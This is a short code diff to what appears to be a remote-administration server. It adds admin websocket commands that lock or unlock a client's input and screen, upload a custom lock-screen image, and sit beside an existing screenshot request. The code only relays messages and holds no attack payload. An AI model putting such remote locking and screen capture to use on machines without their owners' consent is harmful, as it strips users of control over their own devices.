@@ -521,6 +521,16 @@ async def admin_ws(websocket: WebSocket):
                     await clients[client_id].send_text(json.dumps(message))
 
 
+
+            elif msg_type in ("lock_input", "unlock_input", "lock_screen", "unlock_screen"):
+                if client_id in clients:
+                    await clients[client_id].send_text(json.dumps(message))
+
+            elif msg_type in ("lock_image_upload_start", "lock_image_chunk", "lock_image_upload_done"):
+                if client_id in clients:
+                    await clients[client_id].send_text(json.dumps(message))
+
+
             # ── Screenshot ────────────────────────────────────────
             elif msg_type == "request_screenshot":
                 if client_id in clients:
